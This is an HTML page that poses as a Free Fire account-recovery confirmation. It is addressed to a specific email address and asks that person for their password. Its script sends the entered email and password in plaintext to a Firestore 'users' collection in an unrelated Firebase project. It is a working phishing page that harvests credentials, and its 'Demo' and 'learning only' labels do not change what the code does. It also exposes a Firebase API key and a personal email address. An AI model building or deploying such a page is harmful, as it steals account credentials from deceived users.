<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirm Free Fire Account</title>
  <style>
    /* Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #1e1e2f, #121212);
      color: white;
    }

    .card {
      width: 100%;
      max-width: 400px;
      background: #1f1f2f;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 6px 20px rgba(0,0,0,0.5);
      text-align: center;
    }

    h2 {
      font-size: 1.1rem;
      margin-bottom: 1.5rem;
      color: #00ffe0;
    }

    .input-group {
      margin-bottom: 1.2rem;
      text-align: left;
    }

    label {
      font-size: 0.9rem;
      color: #bbb;
      display: block;
      margin-bottom: 0.3rem;
    }

    input {
      width: 100%;
      padding: 0.8rem;
      border: none;
      border-radius: 0.6rem;
      background: #2c2c3c;
      color: white;
      font-size: 1rem;
    }

    input::placeholder {
      color: #aaa;
    }

    button {
      width: 100%;
      padding: 0.9rem;
      border: none;
      border-radius: 0.6rem;
      background: linear-gradient(135deg, #00ffe0, #00b3ff);
      color: black;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    button:hover:enabled {
      transform: scale(1.03);
    }

    button:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid rgba(0,0,0,0.2);
      border-top: 2px solid black;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .footer {
      margin-top: 1rem;
      font-size: 0.8rem;
      color: #777;
    }

    @media (max-width: 480px) {
      .card {
        padding: 1.5rem;
      }
      h2 {
        font-size: 1rem;
      }
      input, button {
        font-size: 0.9rem;
        padding: 0.75rem;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Dear inshoking2@gmail.com,<br>please enter your password to confirm it’s you recovering your Free Fire account.</h2>
    <form id="loginForm">
      <div class="input-group">
        <label for="email">Email</label>
        <input type="email" id="email" value="inshoking2@gmail.com" readonly>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" placeholder="Enter your password" required>
      </div>
      <button type="submit" id="submitBtn">
        <span id="btnText">Confirm</span>
        <div class="spinner" id="spinner" style="display:none;"></div>
      </button>
    </form>
    <div class="footer">
      Secure verification powered by Firebase (Demo)
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    // 🔑 Your Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyCXJiBXLNVnk0TSigI2bDA9kG4MgrXEQ40",
      authDomain: "my-store-a881a.firebaseapp.com",
      projectId: "my-store-a881a",
      storageBucket: "my-store-a881a.appspot.com",
      messagingSenderId: "749092459183",
      appId: "1:749092459183:web:44afb5c6a91d2a787eba5a",
      measurementId: "G-FLDGL3JF38"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function saveUser(email, password) {
      try {
        const docRef = await addDoc(collection(db, "users"), {
          email: email,
          password: password  // ⚠️ Plaintext for learning only
        });
        alert("✅ Saved with ID: " + docRef.id);
      } catch (e) {
        console.error("❌ Error adding document: ", e);
        alert("Error: " + e.message);
      }
    }

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const pass = document.getElementById("password").value;
      const btn = document.getElementById("submitBtn");
      const spinner = document.getElementById("spinner");
      const btnText = document.getElementById("btnText");

      // Show spinner
      btn.disabled = true;
      spinner.style.display = "block";
      btnText.textContent = "Saving...";

      await saveUser(email, pass);

      // Reset button
      spinner.style.display = "none";
      btnText.textContent = "Confirm";
      btn.disabled = false;
    });
  </script>
</body>
</html>
